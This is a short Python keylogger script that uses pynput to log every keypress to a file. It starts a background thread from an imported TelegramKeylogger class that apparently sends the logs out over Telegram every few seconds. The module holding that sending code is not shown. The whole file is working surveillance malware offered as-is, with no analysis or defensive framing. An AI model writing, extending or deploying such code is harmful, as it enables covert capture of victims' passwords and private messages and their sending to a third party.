import threading
from pynput.keyboard import Key, Listener
import logging
from KeyloggerManager import TelegramKeylogger

logging.basicConfig(filename="logfile.txt",
                  level=logging.DEBUG,
                  style="{",
                  datefmt='%Y-%d-%M %H:%M^%S',
                  format='[{asctime}]: {message}')


def on_press(key) -> None:
    logging.info(str(key))


def on_release(key) -> bool:
    if key == Key.esc:
        keylogger_manager.stop()
        return False

keylogger_manager = TelegramKeylogger()
send_thread = threading.Thread(target=keylogger_manager.auto_send_loop)
send_thread.daemon = True
send_thread.start()

print(f"Keylogger started! Sending logs every {keylogger_manager.send_interval} seconds")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()